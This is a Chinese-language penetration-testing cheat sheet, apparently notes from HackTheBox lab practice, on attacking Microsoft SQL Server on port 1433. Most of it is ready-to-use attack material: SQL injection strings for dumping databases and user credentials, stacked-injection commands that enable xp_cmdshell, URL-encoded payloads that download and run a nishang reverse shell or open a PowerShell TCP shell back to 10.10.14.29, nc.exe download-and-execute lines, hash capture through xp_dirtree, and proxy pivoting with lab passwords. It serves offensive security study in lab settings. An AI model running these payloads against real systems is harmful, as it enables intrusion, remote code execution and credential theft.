Microsoft SQL Server , Mssql , 默认端口号1433 
常见与 asp/aspx + sql server + **IIS**

##### SQL 注入  
[0x09 StreamIO (mssql注入,LFI,Firefox凭据泄露)](../../0x0B%20HackTheBox%20WP/靶机推荐第五组%2081-120暨内⽹和域渗透学习路径/0x09%20StreamIO%20(mssql注入,LFI,Firefox凭据泄露).md)    （包含 mssql 注入的靶机）
一定要检查细致 :    '    "    ')    ")     , 单引号前面的数据也有可能影响最后结果建议多写一点
**(一般来说 mssql 的堆叠注入比较多)**
```mysql
qwe' and 1=1 -- -
qwe' and 1=1; -- -
qwe' -- -
qwe' or 1=1; -- -
qwe' or 1=1 -- -
qwe' oR 1=1 -- -
qwe' || 1=1 -- -
qwe' && 1=1 -- -
qwe' union select 1,2,3,4,5,6; -- -
qwe' union select 1,2,3,4,5,6 -- -
qwe'; -- -
```

MSSQL 基本注入命令

```sql
@@version
db_name()  当前数据库名字
```

```sql
相当于检索数据
QWE' union select 1,name,3,4,5,6 from master..sysdatabases;-- -
```

```sql
检索用户表的信息
QWE' union select 1,name,id,4,5,6 from [DATABASE]..sysobjects where xtype='U' -- -

sysobjects是一个系统表，包含了数据库中的对象(表，视图，存储过程...)
xtype是一个条件，'U'表示User Table，所以限制了返回对象类型是用户表，其他类型的对象将被排除
```

拿到 name 和 id，读取列
```sql
QWE' union select 1,name,id,4,5,6 from [DATABASE]..syscolumns where id in ([ID]) -- -
qwe' union select 1,2,3,4,column_name FROM information_schema.columns WHERE table_name = 'Logins' -- 
```

读取数据
```bash
QWE' union select 1,concat(username,':',password),3,4,5,6 from users -- -
qwe' union select 1,2,3,username,password from Logins -- -
```

### 堆叠注入利用
**Ms SQL 启用 Enable xp_cmdshell 攻击方法**    > 注意使用 Unicode 编码
https://www.tarlogic.com/blog/red-team-tales-0x01/
(自行判断注入方式单引号双引号等)
```
EXEC sp_configure 'show advanced options', 1;-- -
EXEC sp_configure 'xp_cmdshell', 1;-- -
RECONFIGURE;-- -
```

**执行系统命令：**
```
qwe';EXEC xp_cmdshell "ping x.x.x.x";-- -
```

**尝试直接指定 powershell 路径**
```
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  (x32)
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe  (x64)
```
测试 ping
```
powershell+ping+192.168.45.171
C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe+ping+192.168.45.171
```

**0x01 Invoke-reverseShellTcp.ps1**
上传 nishang 的 Invoke-ReverseShellTcp.ps1到靶机
在最后一行添加 `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.29 -Port 443`
![](photos/Pasted%20image%2020240314155203.png)

```
3%3bEXEC+xp_cMdshEll+'C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe+"iex(new-object+net.webclient).downloadstring(\"http://10.10.14.29/Invoke-PowerShellTcp.ps1\")"'--+-
```

**0x02 直接弹反弹 shell**
```
3%3bexecute+xp_cmDshElL+'C%3a\windows\syswow64\windowspowershell\v1.0\powershell.exe+"$client+%3d+new-object+system.net.sockets.tcpclient(\"10.10.14.29\",443)%3b$stream+%3d+$client.getstream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.read($bytes,+0,+$bytes.length))+-ne+0){%3b$data+%3d+(new-object+-typename+system.text.asciiencoding).getstring($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+out-string+)%3b$sendback2+%3d+$sendback+%2b+\"PS+\"+%2b+(pwd).path+%2b+\"^>+\"%3b$sendbyte+%3d+([text.encoding]%3a%3aascii).getbytes($sendback2)%3b$stream.write($sendbyte,0,$sendbyte.length)%3b$stream.flush()}%3b$client.close()"'%3b
```

**0x03 上传 nc.exe**
```powershell
qwe';EXEC xp_cmDshEll "powershell /c iwr -Uri http://x.x.x.x/nc64.exe -OutFile C:\\programdata\\nc.exe"; -- -
qwe';EXEC xp_cmDshEll "cmd /c C:\\programdata\\nc.exe -e cmd x.x.x.x 2233"
```


## 链接数据库

### and with the user name [sa] and default password [RPSsql12345]
##### sqlcmd.exe （Windows）

链接数据库
```
sqlcmd -S localost -U xxx -P xxx -d [DATABASE] -Q [SQLCommand]
```

查询表
```
sqlcmd -S localost -U xxx -p xxx -d [DATABASE] -Q "select name from sys.tables;"
```

读取数据
```
sqlcmd -S localost -U xxx -p xxx -d [DATABASE] -Q "select * from [TABLE];"
```

##### mssqlclient.py （Linux）

```bash
└─$ locate mssqlclient.py
/usr/share/doc/python3-impacket/examples/mssqlclient.py
```

```bash
/usr/share/doc/python3-impacket/examples/mssqlclient.py licordebellota.htb/Kaorz:Roper4155@10.129.228.115 [-windows-auth  (Windows链接记得加上)]
```

```
enable_xp_cmdshell
xp_cmdshell whoami
SELECT * FROM fn_my_permissions(NULL, 'SERVER');  (查看当前链接数据库用户权限信息)
select name from sys.databases
use xxx
select name from sys.tables
select * from xxx
xp_dirtree C:\inetpub\wwwroot


xp_cmdshell \\10.10.14.29\share\nc64.exe -e cmd.exe 10.10.14.29 2233
```

##### mssqlproxy.py
https://github.com/blackarrowsec/mssqlproxy
针对5985只在内网，外网开放1433的情况
![](photos/Pasted%20image%2020240205131454.png)

```bash
git clone https://github.com/djhons/mssqlproxy.git
```

```bash
python3 ./mssqlproxy/mssqlclient.py licordebellota.htb/sa:'#mssql_s3rV1c3!2020'@10.129.46.75
```

```bash
SQL> enable_ole
SQL> upload mssqlproxy/reciclador.dll C:\windows\temp\reciclador.dll   (上传动态链接库)
ctrl ^ c
wget https://github.com/blackarrowsec/mssqlproxy/releases/download/0.1/assembly.dll
python3 mssqlclient.py licordebellota.htb/sa:'#mssql_s3rV1c3!2020'@10.129.46.75 -install -clr assembly.dll
python3 mssqlclient.py licordebellota.htb/sa:'#mssql_s3rV1c3!2020'@10.129.46.75 -start -reciclador 'C:\Windows\temp\reciclador.dll'
```

修改 proxychains4.conf
```bash
sudo bash -c 'echo "socks5 127.0.0.1  1337" >> /etc/proxychains4.conf'
```

连接本地 winrm
```bash
proxychains evil-winrm -i 127.0.0.1 -u svc_mssql -p '#mssql_s3rV1c3!2020'
```

#### ATTACK

**使用 xp_dirtree 配合 kali 中的 impacket-smbserver 当做中间人拿到访问的凭据 hash**

- Kali
```bash
impacket-smbserver share .  -smb2support
```

- Target
```bash
EXEC xp_dirtree '\\10.10.14.16\share'
```


**whommi priv 拥有 SeImpersonate 权限可以进行提权**
[0x03 Windows , AD 攻击向量 ( PrivEsc )](../0x03%20Windows/0x03%20Windows%20,%20AD%20攻击向量%20(%20PrivEsc%20).md)


# 域渗透

##### 手动 sql 注入转储域用户
参考 [3306 - MySQL(SQL Injection)](3306%20-%20MySQL(SQL%20Injection).md) 

